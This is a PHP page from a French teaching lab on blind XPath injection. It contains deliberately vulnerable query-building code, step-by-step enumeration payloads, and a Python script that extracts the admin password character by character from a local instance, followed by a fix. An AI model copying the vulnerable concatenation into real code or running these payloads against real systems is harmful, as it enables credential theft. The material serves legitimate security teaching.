<?php
require_once 'config.php';

if (!isLoggedIn()) {
    redirect('login.php');
}

$user_data = null;
$error = '';
$query_displayed = '';
$found = false;

if (isset($_GET['id'])) {
    $id = $_GET['id'];
    
    try {
        // Charger le fichier XML des utilisateurs
        $xml = loadXML('users.xml');
        
        // VULNERABLE: Concaténation directe dans XPath
        $query = "//user[id='$id']";
        
        logXPath($query);
        
        // Exécuter la requête XPath
        $result = executeXPath($xml, $query);
        
        if ($result->length > 0) {
            $found = true;
            $users = nodeListToArray($result);
            $user_data = $users[0];
        } else {
            $found = false;
        }
        
        if (DEBUG_MODE) {
            $query_displayed = $query;
        }
        
    } catch (Exception $e) {
        $error = showError("Erreur lors de la recherche", $e->getMessage());
        if (DEBUG_MODE) {
            $query_displayed = $query ?? '';
        }
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Produits - XPath Injection Lab</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <header>
            <h1> Recherche de produits</h1>
            <p class="subtitle">Scénario 3: Blind XPath Injection</p>
        </header>

        <nav class="navigation">
            <a href="dashboard.php">Dashboard</a>
            <a href="search.php">Recherche</a>
            <a href="products.php" class="active">Produits</a>
            <?php if (isAdmin()): ?>
                <a href="admin.php">Admin Panel</a>
            <?php endif; ?>
            <a href="logout.php">Déconnexion</a>
        </nav>

        <div class="content">
            <div class="card">
                <h2>Rechercher un produit par ID</h2>
                
                <?php if ($error): ?>
                    <?php echo $error; ?>
                <?php endif; ?>

                <?php if ($query_displayed): ?>
                    <div class="debug">
                        <strong> Requête XPath exécutée:</strong>
                        <pre><?php echo htmlspecialchars($query_displayed); ?></pre>
                    </div>
                <?php endif; ?>

                <form method="GET" action="">
                    <div class="form-group">
                        <label for="id">ID du produit</label>
                        <input 
                            type="text" 
                            id="id" 
                            name="id" 
                            placeholder="Entrez un ID de produit (1-5)"
                            value="<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>"
                        >
                    </div>
                    <button type="submit" class="btn btn-primary">Rechercher</button>
                </form>

                <?php if (isset($_GET['id'])): ?>
                    <?php if ($found): ?>
                        <div class="success" style="margin-top: 20px;">
                             Produit trouvé !
                        </div>
                    <?php else: ?>
                        <div class="error" style="margin-top: 20px;">
                            ❌ Produit non trouvé
                        </div>
                    <?php endif; ?>
                <?php endif; ?>
            </div>

            <?php if ($user_data): ?>
            <div class="card">
                <h2>Informations du produit</h2>
                <table class="info-table">
                    <tr>
                        <th>ID</th>
                        <td><?php echo htmlspecialchars($user_data['id']); ?></td>
                    </tr>
                    <tr>
                        <th>Username</th>
                        <td><?php echo htmlspecialchars($user_data['username']); ?></td>
                    </tr>
                    <tr>
                        <th>Email</th>
                        <td><?php echo htmlspecialchars($user_data['email']); ?></td>
                    </tr>
                    <tr>
                        <th>Role</th>
                        <td><?php echo htmlspecialchars($user_data['role']); ?></td>
                    </tr>
                </table>
            </div>
            <?php endif; ?>

            <div class="card">
                <h3> Produits disponibles</h3>
                <ul>
                    <li>ID 1 - Laptop Pro</li>
                    <li>ID 2 - Wireless Mouse</li>
                    <li>ID 3 - USB-C Cable</li>
                    <li>ID 4 - Monitor 27"</li>
                    <li>ID 5 - Keyboard Mechanical</li>
                </ul>
            </div>

            <div class="card hints-section">
                <h3> Objectif</h3>
                <p>Extraire des informations du fichier <strong>users.xml</strong> en utilisant une technique d'injection XPath aveugle (Blind XPath Injection)</p>

                <details>
                    <summary>Qu'est-ce qu'une Blind XPath Injection ?</summary>
                    <p>Contrairement aux injections classiques, une injection aveugle ne retourne pas directement les données.</p>
                    <p>Vous ne voyez que <strong>OUI (produit trouvé)</strong> ou <strong>NON (produit non trouvé)</strong>.</p>
                    <p>Vous devez poser des questions Oui/Non pour extraire l'information caractère par caractère.</p>
                </details>

                <details>
                    <summary>Indice 1: Tester une condition</summary>
                    <p>Vous pouvez ajouter une condition avec <code>and</code>:</p>
                    <pre>1' and '1'='1</pre>
                    <p>Si le produit est trouvé → la condition est vraie</p>
                    <p>Si le produit n'est pas trouvé → la condition est fausse</p>
                </details>

                <details>
                    <summary>Indice 2: Fonction substring()</summary>
                    <p>XPath a une fonction <code>substring(string, start, length)</code> qui extrait des caractères:</p>
                    <pre>substring('admin', 1, 1) retourne 'a'</pre>
                    <p>Vous pouvez tester: <code>1' and substring(//user[1]/username, 1, 1)='a</code></p>
                </details>

                <details>
                    <summary>Indice 3: Énumération caractère par caractère</summary>
                    <p>Pour extraire le premier username :</p>
                    <ol>
                        <li>Tester la 1ère lettre: <code>1' and substring(//user[1]/username, 1, 1)='a</code></li>
                        <li>Si trouvé → première lettre = 'a'</li>
                        <li>Tester la 2ème lettre: <code>1' and substring(//user[1]/username, 2, 1)='d</code></li>
                        <li>Continuer jusqu'à avoir le mot complet</li>
                    </ol>
                </details>

                <details>
                    <summary>💡 Solution: Extraire le password admin</summary>
                    <div class="solution-box">
                        <p><strong>Technique manuelle:</strong></p>
                        <p>Testez caractère par caractère:</p>
                        <pre>1' and substring(//user[username='admin']/password, 1, 1)='a
1' and substring(//user[username='admin']/password, 1, 1)='b
...
1' and substring(//user[username='admin']/password, 1, 1)='a' → Trouvé !</pre>
                        <p>Puis la 2ème lettre:</p>
                        <pre>1' and substring(//user[username='admin']/password, 2, 1)='a
1' and substring(//user[username='admin']/password, 2, 1)='b
...
1' and substring(//user[username='admin']/password, 2, 1)='d' → Trouvé !</pre>
                        <p>Continuez jusqu'à avoir: <code>admin123</code></p>
                    </div>
                </details>
            </div>

            <div class="card learning-section">
                <h2> Technique: Blind XPath Injection</h2>
                <p>Cette technique permet d'extraire des données sans les voir directement, en posant des questions Oui/Non.</p>

                <div class="code-example">
                    <h4>Code vulnérable:</h4>
                    <pre>$query = "//user[id='$id']";
if ($result->length > 0) {
    echo "Produit trouvé";
} else {
    echo "Produit non trouvé";
}</pre>
                </div>

                <div class="code-example">
                    <h4>Payload d'énumération:</h4>
                    <pre>1' and substring(//user[1]/username, 1, 1)='a</pre>
                </div>

                <div class="code-example">
                    <h4>Requête résultante:</h4>
                    <pre>//user[id='1' and substring(//user[1]/username, 1, 1)='a']</pre>
                    <p class="explanation">↑ Si trouvé = la première lettre est 'a'. Sinon, essayer 'b', 'c', etc.</p>
                </div>

                <h3> Automatisation avec Python</h3>
                <pre><code class="language-python">import requests

def extract_password():
    password = ""
    url = "http://localhost:8081/products.php"
    
    for position in range(1, 20):
        for char in "abcdefghijklmnopqrstuvwxyz0123456789":
            payload = f"1' and substring(//user[username='admin']/password, {position}, 1)='{char}"
            response = requests.get(url, params={'id': payload})
            
            if "Produit trouvé" in response.text:
                password += char
                print(f"Position {position}: {char} → {password}")
                break
        else:
            break  # Fin du mot de passe
    
    return password

print("Password admin:", extract_password())
</code></pre>

                <h3> Comment corriger ?</h3>
                <div class="code-example correct">
                    <h4>Code sécurisé avec validation stricte:</h4>
                    <pre>// Valider que l'ID est bien un nombre
if (!ctype_digit($id)) {
    die("ID invalide");
}

// Convertir en entier
$id = (int)$id;

// Utiliser dans la requête XPath
$query = "//user[id='$id']";</pre>
                    <p class="explanation">L'injection devient impossible car seuls les nombres sont acceptés</p>
                </div>
            </div>
        </div>

        <footer>
            <p>Lab DIABLE v3.0 - DSI ISFA 2025-2026</p>
        </footer>
    </div>
</body>
</html>